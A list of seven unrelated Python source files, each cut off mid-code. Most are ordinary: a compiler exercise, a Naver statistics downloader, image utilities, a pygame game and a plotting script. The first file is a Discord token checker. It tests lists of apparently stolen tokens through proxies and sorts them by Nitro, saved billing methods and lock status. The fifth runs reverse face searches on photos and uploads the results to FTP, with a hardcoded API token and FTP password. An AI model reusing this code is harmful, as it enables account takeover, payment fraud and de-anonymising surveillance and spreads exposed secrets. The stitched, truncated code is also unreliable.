    "import os, time, requests, colorama, random, json ,concurrent.futures, fade, threading ;from colorama import Fore\r\nW = Fore.LIGHTWHITE_EX\r\nR = Fore.RED\r\nG = Fore.LIGHTGREEN_EX\r\nB = Fore.BLUE\r\nM = Fore.LIGHTMAGENTA_EX\r\nC = Fore.LIGHTCYAN_EX\r\nY = Fore.LIGHTYELLOW_EX\r\nBLACK = Fore.LIGHTBLACK_EX\r\nRESET = Fore.RESET\r\n\r\nGUI = \"\"\"\r\n          \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\r\n          \u2551               [\u2af8] Talkin-shop [\u2af7]                   \u2551\r\n          \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\r\n          \u2551           \r\n _____          _   _     _            _           _                         _                 _               \r\n|_   _|  __ _  | | | |__ (_)  _ _     | |_   ___  | |__  ___   _ _      __  | |_    ___   __  | |__  ___   _ _                                               \r\n  | |   / _` | | | | / / | | | ' \\    |  _| / _ \\ | / / / -_) | ' \\    / _| | ' \\  / -_) / _| | / / / -_) | '_|       \r\n  |_|   \\__,_| |_| |_\\_\\ |_| |_||_|    \\__| \\___/ |_\\_\\ \\___| |_||_|   \\__| |_||_| \\___| \\__| |_\\_\\ \\___| |_|\r\n  \r\n  \r\n          \u2551    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557    \u2551\r\n          \u2551    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557    \u2551\r\n          \u2551 \u2554\u2550\u2550\u255d       [\u2af7] Talkin  Token  Checker [\u2af8]     \u255a\u2550\u2550\u2557 \u2551\r\n          \u2560\u2550\u255d                                                  \u255a\u2550\u2563\r\n          \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\r\n\"\"\"\r\n\r\nFADED_GUI = fade.purplepink(GUI)\r\n\r\nVALID_TOKENS = 0\r\nNO_VALID_TOKENS = 0\r\nLOCKED_TOCKENS = 0\r\nNITRO_TOKENS = 0\r\nBILLING_TOKENS = 0\r\nNO_LOCKED_TOKENS = 0\r\nCPM = 0\r\n\r\ndef clsTerminal():\r\n    os.system(\"cls\")\r\n\r\nwith open('Tokens.txt') as tokensFile:\r\n    allTokens = tokensFile.read().splitlines()\r\n\r\ndef printGui():\r\n    print(FADED_GUI)\r\n\r\nos.system(\"title Talkin-shop ^| Token Checker\")\r\n\r\ndef getChecksPerMinut():\r\n    global CPM\r\n    while True:\r\n        CPM = VALID_TOKENS + NO_VALID_TOKENS\r\n        time.sleep(60)\r\n        CPM = 0\r\n\r\ndef getProxy():\r\n    global allProxys\r\n    with open('proxys.txt') as proxyFile:\r\n        allProxys = proxyFile.read().splitlines()\r\n    proxy = random.choice(allProxys)\r\n    proxy = proxy.split(\":\")\r\n    proxy = proxy[0] + \":\" + proxy[1]\r\n    allProxys = {\"http\": f\"http://{proxy}\", \"https\": f\"http://{proxy}\"}\r\n\r\ndef cleanFiles():\r\n    with open('output/Working.txt', 'w') as workingTokensFile:\r\n        workingTokensFile.write(\"\")\r\n    with open('output/NotWorking.txt', 'w') as notWorkingTokensFile:\r\n        notWorkingTokensFile.write(\"\")\r\n    with open('output/Nitro.txt', 'w') as nitroTokensFile:\r\n        nitroTokensFile.write(\"\")\r\n    with open('output/Billing.txt', 'w') as billingTokensFile:\r\n        billingTokensFile.write(\"\")\r\n    with open('output/Locked.txt', 'w') as lockedTokensFile:\r\n        lockedTokensFile.write(\"\")\r\n    with open('output/NotLocked.txt', 'w') as notLockedTokensFile:\r\n        notLockedTokensFile.write(\"\")\r\n\r\ndef checkToken(token):\r\n    global VALID_TOKENS, NO_VALID_TOKENS, LOCKED_TOCKENS, NITRO_TOKENS, BILLING_TOKENS, NO_LOCKED_TOKENS\r\n    try:\r\n        tokenHeaders = {\"authorization\": token}\r\n        if useProxys == True:\r\n            getProxy()\r\n            tokenRequest = requests.get(\"https://discordapp.com/api/v6/users/@me\", headers=tokenHeaders, proxies=allProxys)\r\n            checkJson = tokenRequest.json()\r\n        else:\r\n            tokenRequest = requests.get(\"https://discordapp.com/api/v6/users/@me\", headers=tokenHeaders)\r\n            checkJson = tokenRequest.json()\r\n\r\n        if \"username\" in checkJson and \"discriminator\" in checkJson:\r\n            tokenUsername = checkJson[\"username\"] + \"#\" + checkJson[\"discriminator\"]\r\n            tokenLocked = requests.get(\"https://discordapp.com/api/v6/users/@me/settings\", headers=tokenHeaders)\r\n            if tokenLocked.status_code == 200:\r\n                tokenLocked = False\r\n            else:\r\n                tokenLocked = True\r\n            tokenNitro = checkJson[\"premium_type\"]\r\n            if tokenNitro == 0:\r\n                tokenNitro = False\r\n            elif tokenNitro == 2:\r\n                tokenNitro = True\r\n            tokenBilling = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers=tokenHeaders)\r\n            if len(tokenBilling.json()) != 0 and tokenLocked == False:\r\n                tokenBilling = True\r\n            else:\r\n                tokenBilling = False\r\n            tokenLocked = requests.get(\"https://discordapp.com/api/v6/users/@me/settings\", headers=tokenHeaders)\r\n            if tokenLocked.status_code == 200:\r\n                tokenLocked = False\r\n            else:\r\n                tokenLocked = True\r\n            hiddedToken = token[0:4] + \"*******\" + token[24:32]\r\n\r\n            with open('output/Working.txt', 'a') as workingTokensFile:\r\n                workingTokensFile.write(token + \"\\n\")\r\n                VALID_TOKENS += 1\r\n            if tokenNitro == True:\r\n                with open('output/Nitro.txt', 'a') as nitroTokensFile:\r\n                    nitroTokensF",
    "from typing import List\nimport pandas as pd\n\n\nclass Expression:\n    def _init_(self, operator=None, left_expr=None, right_expr=None, value=None):\n        self.operator = operator\n        self.left_expr = left_expr\n        self.right_expr = right_expr\n        self.value = value\n\n    def _str_(self):\n        return (\n            f\"{self.operator=} | {self.left_expr=} | {self.right_expr=} | {self.value=}\"\n        )\n\n    def generate_3addr_code(self):\n        if self.operator is None:\n            return self.value\n        elif self.operator == \"+\":\n            return f\"T{self.value}=T{self.left_expr.generate_3addr_code()}+T{self.right_expr.generate_3addr_code()}\"\n        elif self.operator == \"-\":\n            return f\"T{self.value}=T{self.left_expr.generate_3addr_code()}-T{self.right_expr.generate_3addr_code()}\"\n        elif self.operator == \"*\":\n            return f\"T{self.value}=T{self.left_expr.generate_3addr_code()}*T{self.right_expr.generate_3addr_code()}\"\n        elif self.operator == \"/\":\n            return f\"T{self.value}=T{self.left_expr.generate_3addr_code()}/T{self.right_expr.generate_3addr_code()}\"\n        elif self.operator == \"<\":\n            return f\"if (T{self.left_expr.generate_3addr_code()}<T{self.right_expr.generate_3addr_code()}) goto {self.value}\"\n\n\ndef build(string, start, end):\n    if start >= end:\n        return Expression(value=int(string[start:end]))\n\n    operator_indices = [i for i in range(start, end) if string[i] in \"+-*/<\"]\n    if not operator_indices:  # no operator found\n        return Expression(value=(string[start:end]))\n\n    op_index = min(operator_indices)  # choose the first operator\n    root = Expression(operator=string[op_index])\n    root.left_expr = build(string, start, op_index)\n    root.right_expr = build(string, op_index + 1, end)\n    return root\n\n\n# Example usage:\nlines = []\nwith open(\"input.txt\", \"r\") as f:\n    lines = f.readlines()\n\nexpression_string = lines[0].strip()\nstart = expression_string.index(\"(\") + 1\nend = expression_string.index(\")\")\nroot = build(expression_string, start, end)\n\n# output = \"\"\n\n\n# print(root.generate_3addr_code())\ndef inorder(root):\n    # global output\n    if root is None:\n        return\n    # output += \"(\"\n    inorder(root.left_expr)\n    print(root)\n    # output += root.value\n    inorder(root.right_expr)\n    # output += \")\"\n\n\nOPERATORS = [\"+\", \"-\", \"*\", \"/\", \"<\", \">\", \"=\"]\n\n\ndef go_get_tokens(s):\n    d = {}\n    for i in range(len(s)):\n        if s[i] in OPERATORS:\n            if s[i] not in d:\n                d[s[i]] = []\n            d[s[i]].append((s[:i], s[i + 1 :]))\n    if \"=\" in d:\n        return [\"=\", d[\"=\"]]\n    elif \"/\" in d:\n        return [\"/\", d[\"=\"]]\n    elif \"*\" in d:\n        return [\"\", d[\"\"]]\n    elif \"+\" in d:\n        return [\"+\", d[\"+\"]]\n    elif \"-\" in d:\n        return [\"-\", d[\"-\"]]\n\n\nclass Statement:\n    def _init_(self, L):\n        self.list_of_statements = L\n\n\nclass Assignment:\n    def _init_(self, e1, e2):\n        self.operator = \"=\"\n        self.left_expr = e1\n        self.right_expr = e2\n\n    def _str_(self):\n        return f\"{self.operator=} | {self.left_expr=} | {self.right_expr=}\"\n\n\ndef parse_statements(statements):\n    assigns = []\n    for i in statements:\n        tokens = go_get_tokens(i)\n        op, l = tokens\n        left = build(l[0][0], 0, len(l[0][0]))\n        right = build(l[0][1], 0, len(l[0][1]))\n        assignment = Assignment(left, right)\n        assigns.append(assignment)\n    return assigns\n\n\n# inorder(root)\n# print(output)\nstatemenst = []\nlines = [_.strip() for _ in lines]\nopen = lines.index(\"{\") + 1\nend = lines.index(\"}\")\n# print(lines[open:end])\nassignments = parse_statements(lines[open:end])\n# print(assignments)\n# for i in assignments:\n#     print(\"*** Statement ****\")\n#     print()\n#     print(\"Left\")\n#     inorder(i.left_expr)\n#     print(f\"Operator: {i.operator}\")\n#     print(\"Right\")\n#     inorder(i.right_expr)\n#     print()\n#\nstatement_object = Statement(assignments)\n\n\nclass WhileExpression:\n    def _init_(self, expressions, statement):\n        self.t1 = \"while\"\n        self.m1 = None\n        self.expression = expressions\n        self.statements = statement\n\n\nwhile_expression = WhileExpression(root, statement_object)\nprint(while_expression)\n\n\nthree_address_codes = []\n\n\ndef statement_tac(statement):\n    variables = 1\n    for s in statement:\n        # print(s)\n        left_val = s.left_expr.value\n        right_val = \"\"\n        right_val += (\n            s.right_expr.left_expr.value\n            + s.right_expr.operator\n            + s.right_expr.right_expr.value\n        )\n        right_val = right_val.strip(\";\")\n        # print(left_val)\n        # print(right_val)\n        three_address_codes.append(f\"T{variables} = {right_val}\")\n        three_address_codes.append(f\"{left_val} = T{variables}\")\n        variables += 1\n\n\nSTART = 0\n\n\ndef expression_tac(expression):\n    exp = \"\"\n    # print(expression.left_expr)\n    # print(expression.right_expr)\n    exp += (\n        expression.left_expr.value + expres",
    "import os, time\nimport subprocess\nimport shutil, glob\n\nclass DataDownloader():\n    def __init__(self, year:int, month:int, weekDimStart:tuple):\n        '''\n        example: DataDownloader(2023,10,(2023,09,26))\n        :param year: \ub144\n        :param month: \uc6d4\n        :param weekDimStart: \ubd84\uc11d\ud558\uace0\uc790\ud558\ub294 \uc8fc\uc758 \uc2dc\uc791 \ub0a0\uc9dc\n        '''\n        self.analyticsYear = year\n        self.analyticsMonth = month\n\n        self.analyticsWeekDimStartYear=weekDimStart[0]\n        self.analyticsWeekDimStartMonth=weekDimStart[1]\n        self.analyticsWeekDimStartDay=weekDimStart[2]\n\n        self.chrome='C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe'\n\n    def DownloadAll(self):\n        # 23 = \ub0b4\uac00\ub9cc\ub4e0\uc720\uc988\ub9f5 26 = \ud0c0\uc778\uc81c\uc791\uc720\uc988\ub9f5 326 = \ub9de\ud788\uae30\uc720\uc988\ub9f5\n        for boardID in (23,26,326):\n            self.__download_each_day(boardID)\n            self.__download_each_week(boardID)\n            self.__download_each_month(boardID)\n        self.__download_member_rank_month()\n\n        time.sleep(10)\n\n    # \uc77c\uac04\n    def __download_each_day(self, boardID):\n        endDay=30\n        if self.analyticsMonth in (1,3,5,7,8,10,12):\n            endDay = 31\n        elif self.analyticsMonth == 2:\n            if self.analyticsYear % 4 == 0 and self.analyticsYear % 100 != 0:\n                endDay = 29\n            else:\n                endDay = 28\n\n        print(f'endDay : {endDay}')\n\n        for day in range(1, endDay+1):\n            print(f'boardID:{boardID}, day:{day}')\n            downloadURL = f'https://cafe.stat.naver.com/download/cafe/17046257/rank/articleCv?service=CAFE&timeDimension=DATE&startDate={self.analyticsYear}-{self.analyticsMonth:02d}-{day:02d}&selectedBoardId={boardID}'\n            cmd = f'\\\"{self.chrome}\\\" \"{downloadURL}\"'\n            print(cmd)\n            subprocess.check_call(cmd)\n            time.sleep(1)\n\n    def __getMonthEndDay(self, year, month):\n        endDay=30\n        if month in (1,3,5,7,8,10,12):\n            endDay=31\n        elif month == 2:\n            if year % 4 == 0 and year % 100 != 0:\n                endDay = 29\n            else:\n                endDay = 28\n        return endDay\n    # \uc8fc\uac04\n    def __download_each_week(self, boardID):\n        \n        curYear=self.analyticsWeekDimStartYear\n        curMonth=self.analyticsWeekDimStartMonth\n        curDay=self.analyticsWeekDimStartDay\n        curMonthEndDay = self.__getMonthEndDay(curYear, curMonth)\n        while curMonth < self.analyticsMonth or (curMonth == self.analyticsMonth and curDay + 6 <= curMonthEndDay):\n            print(f'{curYear}, {curMonth}, {curDay}')\n            downloadURL = f'https://cafe.stat.naver.com/download/cafe/17046257/rank/articleCv?service=CAFE&timeDimension=WEEK&startDate={curYear}-{curMonth:02d}-{curDay:02d}&selectedBoardId={boardID}'\n            cmd = f'\"{self.chrome}\" \"{downloadURL}\"'\n            print(cmd)\n            subprocess.check_call(cmd)\n            time.sleep(2)\n            curDay += 7\n            if curDay > curMonthEndDay:\n                curMonth += 1\n                curDay -= curMonthEndDay\n            if curMonth > 12:\n                curYear += 1\n                curMonth -= 12\n            if curMonth > self.analyticsMonth or (curMonth == self.analyticsMonth and curDay + 6 > curMonthEndDay):\n                break\n            curMonthEndDay = self.__getMonthEndDay(curYear, curMonth)\n\n\n    # \uc6d4\uac04\n    def __download_each_month(self, boardID):\n        downloadURL = f'https://cafe.stat.naver.com/download/cafe/17046257/rank/articleCv?service=CAFE&timeDimension=MONTH&startDate={self.analyticsYear}-{self.analyticsMonth:02d}-01&selectedBoardId={boardID}'\n        cmd = f'\"{self.chrome}\" \"{downloadURL}\"'\n        print(cmd)\n        subprocess.check_call(cmd)\n        time.sleep(2)\n\n    # \uba64\ubc84\uc21c\uc704\n    def __download_member_rank_month(self):\n        # \ubc29\ubb47\ud69f\uc218\n        downloadURL = f'https://cafe.stat.naver.com/download/cafe/17046257/rank/memberVisit?service=CAFE&timeDimension=MONTH&startDate={self.analyticsYear}-{self.analyticsMonth:02d}-01&memberId=%%EB%%A9%%A4%%EB%%B2%%84'\n        cmd = f'\"{self.chrome}\" \"{downloadURL}\"'\n        print(cmd)\n        subprocess.check_call(cmd)\n        # \uac8c\uc2dc\uae00 \uc218\n        downloadURL = f'https://cafe.stat.naver.com/download/cafe/17046257/rank/memberCreate?service=CAFE&timeDimension=MONTH&startDate={self.analyticsYear}-{self.analyticsMonth:02d}-01&memberId=%%EB%%A9%%A4%%EB%%B2%%84'\n        cmd = f'\"{self.chrome}\" \"{downloadURL}\"'\n        print(cmd)\n        subprocess.check_call(cmd)\n        # \ub313\uae00 \uc218\n        downloadURL = f'https://cafe.stat.naver.com/download/cafe/17046257/rank/memberComment?service=CAFE&timeDimension=MONTH&startDate={self.analyticsYear}-{self.analyticsMonth:02d}-01&memberId=%%EB%%A9%%A4%%EB%%B2%%84'\n        cmd = f'\"{self.chrome}\" \"{downloadURL}\"'\n        print(cmd)\n        subprocess.check_call(cmd)\n        # \uc88b\uc544\uc694 \uc218\n        downloadURL = f'https://cafe.stat.naver.com/download/cafe/17046257/rank/memberLiked?service=CAFE&timeDimension=MONTH&startDate={self.analyticsYear}-{self.analyticsMonth:02d}-01&memberId=%%EB%%A9%%A4%%EB%%B2%%84'\n ",
    "import os\nimport math\nimport random\nimport numpy as np\nimport torch\nimport cv2\nfrom torchvision.utils import make_grid\nfrom datetime import datetime\n# import torchvision.transforms as transforms\nimport matplotlib.pyplot as plt\n\n\nIMG_EXTENSIONS = ['.jpg', '.JPG', '.jpeg', '.JPEG', '.png', '.PNG', '.ppm', '.PPM', '.bmp', '.BMP']\n\n\ndef is_image_file(filename):\n    return any(filename.endswith(extension) for extension in IMG_EXTENSIONS)\n\n\ndef get_timestamp():\n    return datetime.now().strftime('%y%m%d-%H%M%S')\n\n\ndef imshow(x, title=None, cbar=False, figsize=None):\n    plt.figure(figsize=figsize)\n    plt.imshow(np.squeeze(x), interpolation='nearest', cmap='gray')\n    if title:\n        plt.title(title)\n    if cbar:\n        plt.colorbar()\n    plt.show()\n\n\n'''\n# =======================================\n# get image pathes of files\n# =======================================\n'''\n\n\ndef get_image_paths(dataroot):\n    paths = None  # return None if dataroot is None\n    if dataroot is not None:\n        paths = sorted(_get_paths_from_images(dataroot))\n    return paths\n\n\ndef _get_paths_from_images(path):\n    assert os.path.isdir(path), '{:s} is not a valid directory'.format(path)\n    images = []\n    for dirpath, _, fnames in sorted(os.walk(path)):\n        for fname in sorted(fnames):\n            if is_image_file(fname):\n                img_path = os.path.join(dirpath, fname)\n                images.append(img_path)\n    assert images, '{:s} has no valid image file'.format(path)\n    return images\n\n\n'''\n# =======================================\n# makedir\n# =======================================\n'''\n\n\ndef mkdir(path):\n    if not os.path.exists(path):\n        os.makedirs(path)\n\n\ndef mkdirs(paths):\n    if isinstance(paths, str):\n        mkdir(paths)\n    else:\n        for path in paths:\n            mkdir(path)\n\n\ndef mkdir_and_rename(path):\n    if os.path.exists(path):\n        new_name = path + '_archived_' + get_timestamp()\n        print('Path already exists. Rename it to [{:s}]'.format(new_name))\n        os.rename(path, new_name)\n    os.makedirs(path)\n\n\n'''\n# =======================================\n# read image from path\n# Note: opencv is fast\n# but read BGR numpy image\n# =======================================\n'''\n\n\n# ----------------------------------------\n# get single image of size HxWxn_channles (BGR)\n# ----------------------------------------\ndef read_img(path):\n    # read image by cv2\n    # return: Numpy float32, HWC, BGR, [0,1]\n    img = cv2.imread(path, cv2.IMREAD_UNCHANGED)  # cv2.IMREAD_GRAYSCALE\n    img = img.astype(np.float32) / 255.\n    if img.ndim == 2:\n        img = np.expand_dims(img, axis=2)\n    # some images have 4 channels\n    if img.shape[2] > 3:\n        img = img[:, :, :3]\n    return img\n\n\n# ----------------------------------------\n# get uint8 image of size HxWxn_channles (RGB)\n# ----------------------------------------\ndef imread_uint(path, n_channels=3):\n    #  input: path\n    # output: HxWx3(RGB or GGG), or HxWx1 (G)\n    if n_channels == 1:\n        img = cv2.imread(path, 0)  # cv2.IMREAD_GRAYSCALE\n        img = np.expand_dims(img, axis=2)  # HxWx1\n    elif n_channels == 3:\n        img = cv2.imread(path, cv2.IMREAD_UNCHANGED)  # BGR or G\n        if img.ndim == 2:\n            img = cv2.cvtColor(img, cv2.COLOR_GRAY2RGB)  # GGG\n        else:\n            img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)  # RGB\n    return img\n\n\ndef imsave(img, img_path):\n    img = np.squeeze(img)\n    if img.ndim == 3:\n        img = img[:, :, [2, 1, 0]]\n    cv2.imwrite(img_path, img)\n\n\n'''\n# =======================================\n# numpy(single) <--->  numpy(uint)\n# numpy(single) <--->  tensor\n# numpy(uint)   <--->  tensor\n# =======================================\n'''\n\n\n# --------------------------------\n# numpy(single) <--->  numpy(uint)\n# --------------------------------\n\n\ndef uint2single(img):\n\n    return np.float32(img/255.)\n\n\ndef uint2single1(img):\n\n    return np.float32(np.squeeze(img)/255.)\n\n\ndef single2uint(img):\n\n    return np.uint8((img.clip(0, 1)*255.).round())\n\n\ndef uint162single(img):\n\n    return np.float32(img/65535.)\n\n\ndef single2uint16(img):\n\n    return np.uint8((img.clip(0, 1)*65535.).round())\n\n\n# --------------------------------\n# numpy(uint) <--->  tensor\n# uint (HxWxn_channels (RGB) or G)\n# --------------------------------\n\n\n# convert uint (HxWxn_channels) to 4-dimensional torch tensor\ndef uint2tensor4(img, data_range):\n    if img.ndim == 2:\n        img = np.expand_dims(img, axis=2)\n    return torch.from_numpy(np.ascontiguousarray(img)).permute(2, 0, 1).float().div(255./data_range).unsqueeze(0)\n\n\n# convert uint (HxWxn_channels) to 3-dimensional torch tensor\ndef uint2tensor3(img):\n    if img.ndim == 2:\n        img = np.expand_dims(img, axis=2)\n    return torch.from_numpy(np.ascontiguousarray(img)).permute(2, 0, 1).float().div(255.)\n\n\n# convert torch tensor to uint\ndef tensor2uint(img, data_range):\n    img = img.data.squeeze().float().clamp_(0, 1*data_range).cpu().numpy()\n    if img.ndim == 3:\n        img = np.transpos",
    "import time\r\nimport requests\r\nimport argparse\r\nimport os\r\nfrom ftplib import FTP\r\n\r\n\r\n\r\nTESTING_MODE = True\r\nAPITOKEN = 'uvy/sDZy70uNXUtoWUVHGItTNSXARmI1OaA0TFOsh3a6hMtkmVi4gNQroJzpt+0HQI0pn7dZbso=' # Your API Token\r\n\r\nparser = argparse.ArgumentParser()\r\nparser.add_argument('--id', help='ID do usu\u00e1rio')\r\nargs = parser.parse_args()\r\nid_usuario = args.id\r\n#usuario = 1533706535\r\n#id_usuario = str(usuario)\r\n\r\ndef search_by_face(image_file):\r\n    if TESTING_MODE:\r\n        print('****** TESTING MODE search, results are inaccurate, and queue wait is long, but credits are NOT deducted ******')\r\n\r\n    site='https://facecheck.id'\r\n    headers = {'accept': 'application/json', 'Authorization': APITOKEN}\r\n    files = {'images': open(image_file, 'rb'), 'id_search': None}\r\n    response = requests.post(site+'/api/upload_pic', headers=headers, files=files).json()\r\n\r\n    if response['error']:\r\n        return f\"{response['error']} ({response['code']})\", None\r\n\r\n    id_search = response['id_search']\r\n    print(response['message'] + ' id_search='+id_search)\r\n    json_data = {'id_search': id_search, 'with_progress': True, 'status_only': False, 'demo': TESTING_MODE}\r\n\r\n    while True:\r\n        response = requests.post(site+'/api/search', headers=headers, json=json_data).json()\r\n        if response['error']:\r\n            return f\"{response['error']} ({response['code']})\", None\r\n        if response['output']:\r\n            return None, response['output']['items']\r\n        print(f'{response[\"message\"]} progress: {response[\"progress\"]}%')\r\n        time.sleep(1)\r\n\r\ndef search_and_print_results():\r\n    time.sleep(5)\r\n    caminho_imagem = os.path.join(id_usuario, 'imagem.jpg')\r\n    image_file = caminho_imagem \r\n    caminho_resultado = os.path.join(id_usuario, f'{id_usuario}.html')\r\n\r\n    # Pesquisar na Internet por rosto\r\n    error, urls_images = search_by_face(image_file)\r\n\r\n    if urls_images:\r\n        # Inicializar a string HTML com a estrutura b\u00e1sica do documento\r\n        html = '''\r\n        <html>\r\n        <head>\r\n            <style>\r\n                body {\r\n                    font-family: Arial, sans-serif;\r\n                }\r\n                .gallery {\r\n                    display: flex;\r\n                    flex-wrap: wrap;\r\n                    justify-content: center;\r\n                    gap: 20px;\r\n                }\r\n                .result {\r\n                    display: flex;\r\n                    flex-direction: column;\r\n                    align-items: center;\r\n                    width: 300px;\r\n                    border: 1px solid #ccc;\r\n                    padding: 10px;\r\n                    border-radius: 5px;\r\n                }\r\n                .result img {\r\n                    width: 200px;\r\n                    height: auto;\r\n                    margin-bottom: 10px;\r\n                }\r\n                .details {\r\n                    text-align: center;\r\n                }\r\n            </style>\r\n        </head>\r\n        <body>\r\n            <div class=\"gallery\">\r\n        '''\r\n\r\n        for im in urls_images:\r\n            score = im['score']\r\n            url = im['url']\r\n            image_base64 = im['base64']\r\n\r\n            # Adicionar o layout HTML para exibir as informa\u00e7\u00f5es da imagem\r\n            html += f'''\r\n            <div class=\"result\">\r\n                <a href=\"{url}\" target=\"_blank\">\r\n                    <img src=\"{image_base64}\" alt=\"Imagem encontrada\">\r\n                </a>\r\n                <div class=\"details\">\r\n                    <h3>Site:</h3>\r\n                    <p>{url}</p>\r\n                    <h3>Pontos:</h3>\r\n                    <p>{score}</p>\r\n                </div>\r\n            </div>\r\n            '''\r\n\r\n        # Fechar a estrutura do documento HTML\r\n        html += '''\r\n            </div>\r\n        </body>\r\n        </html>\r\n        '''\r\n\r\n        # Salvar o HTML como um arquivo\r\n        with open(caminho_resultado, 'w', encoding='utf-8') as file:\r\n            file.write(html)\r\n\r\n        # Upload do arquivo para o servidor FTP\r\n        ftp_host = 's1.serv00.com'\r\n        ftp_user = 'f8969_facecheck2'\r\n        ftp_password = 'Heron!23'\r\n        ftp_directory = ''\r\n\r\n        with FTP(ftp_host) as ftp:\r\n            ftp.login(ftp_user, ftp_password)\r\n            ftp.cwd(ftp_directory)\r\n            \r\n            with open(caminho_resultado, 'rb') as file:\r\n                ftp.storbinary(f'STOR {os.path.basename(caminho_resultado)}', file)\r\n\r\n        print(f\"Arquivo 'resultado.html' salvo com sucesso no servidor FTP!\")\r\n    else:\r\n        print(\"Nenhum link de imagem encontrado.\")\r\n\r\n# Verificar se o m\u00f3dulo est\u00e1 sendo executado diretamente\r\nif __name__ == \"__main__\":\r\n    search_and_print_results()",
    "import pygame\nimport random\n\n# Initialize Pygame\npygame.init()\n\n# Set up some constants\nWIDTH, HEIGHT = 640, 480\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\nGRAY = (200, 200, 200)\n\n# Set up the display\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\npygame.display.set_caption(\"Jogo da adivinha\u00e7\u00e3o\")\n\n# Set up the font\nFONT = pygame.font.SysFont(\"Arial\", 24)\n\n# Set up the game state\nnumber_to_guess = random.randint(1, 100)\nguess = \"\"\nguesses = 0\nnotification = \"\"\n\n# Function to draw text on screen\ndef draw_text(text, font, color, surface, x, y):\n    textobj = font.render(text, 1, color)\n    textrect = textobj.get_rect()\n    textrect.topleft = (x, y)\n    surface.blit(textobj, textrect)\n\n# Set up the game loop\nrunning = True\nwhile running:\n    # Handle events\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n        elif event.type == pygame.KEYDOWN:\n            if event.key == pygame.K_RETURN:\n                if guess.isdigit():\n                    guesses += 1\n                    if int(guess) < number_to_guess:\n                        notification = \"O valor \u00e9 maior do que seu palpite!\"\n                    elif int(guess) > number_to_guess:\n                        notification = \"O valor \u00e9 menor do que seu palpite!\"\n                    else:\n                        notification = \"Parabens! Voc\u00ea acertou em \" + str(guesses) + \" tentativas!\"\n                        guess = \"\"\n                else:\n                    notification = \"Inv\u00e1lido!\"\n                    guess = \"\"\n            elif event.key == pygame.K_BACKSPACE:\n                guess = guess[:-1]\n            else:\n                if event.unicode.isdigit() and len(guess) < 3:\n                    guess += str(event.unicode)\n\n    # Update the screen\n    screen.fill(WHITE)\n    draw_text(\"Advinhe em que n\u00famero estou pensando em entre 1 e 100!\", FONT, BLACK, screen, 10, 10)\n    draw_text(\"Palpite: \" + guess, FONT, BLACK, screen, 10, 50)\n    draw_text(notification, FONT, BLACK, screen, 10, 90)\n\n    # Draw input box\n    pygame.draw.rect(screen, BLACK, (10, 130, 200, 40), 2)\n    pygame.draw.rect(screen, GRAY, (12, 132, 196, 36))\n\n    # Draw buttons\n    pygame.draw.rect(screen, BLACK, (250, 130, 100, 40), 2)\n    draw_text(\"Palpite\", FONT, BLACK, screen, 260, 140)\n\n    pygame.draw.rect(screen, BLACK, (370, 130, 100, 40), 2)\n    draw_text(\"Resetar\", FONT, BLACK, screen, 380, 140)\n\n    pygame.display.flip()\n\n# Quit Pygame\npygame.quit()\n",
    "import sys\nimport os\n\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport pandas as pd\nfrom sklearn.metrics import r2_score\n\nfrom plot_dipri_overhead import size_dict\n\ndef group_last_dipri_overhead(df: pd.DataFrame, last_tp=82800):\n    _fuzzers = df['fuzzer'].drop_duplicates().to_numpy()\n    _cols = ['benchmark', 'dipri_rnd', 'dipri_time_percent']\n    _data = dict()\n    for _fuzzer in _fuzzers:\n        _row = df.loc[(df['fuzzer'] == _fuzzer) &\n                      (df['time'] == last_tp)][_cols]\n        _data_with_size = []\n        for _elem in _row.to_numpy():\n            _di = dict(target=_elem[0], dipri_rnd=_elem[1],\n                       real_map_size=size_dict[_elem[0]],\n                       dipri_time_percent=_elem[2])\n            _data_with_size.append(_di)\n        _data[_fuzzer] = _data_with_size\n    return _data\n\n\ndef cal_pcc(x_true, y_true) -> float:\n    _a, _b = np.polyfit(x_true, y_true, deg=1)\n    _y_pred = _a * x_true + _b\n    return r2_score(y_true=y_true, y_pred=_y_pred)\n\nif __name__ == '__main__':\n\n    if len(sys.argv) != 3:\n        print('Usage: <this_script> <data_csv> <out_dir>')\n        sys.exit(1)\n\n    # Read in args\n    data_csv = 